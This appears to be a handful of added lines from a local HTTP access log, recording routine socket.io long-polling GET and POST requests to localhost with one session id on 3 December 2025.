+9493616199b0926c70ace2d8,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTlaB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:38:04+0530
+0e79a1788c2d7d4f02e267dd,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTlaU&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:38:29+0530
+56c0667eee88d5ca5a4191f6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTrhL&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:38:29+0530
+1c221ae4868ee9567590c392,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTrhV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:38:54+0530
+6c0bf63367fc9996676a1ad6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWTxpO&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:38:54+0530
+b10c3a79882b0511b0a6b119,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWTxpQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:39:19+0530
+06f773b8c0a093144c01151b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWU1wP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:39:19+0530
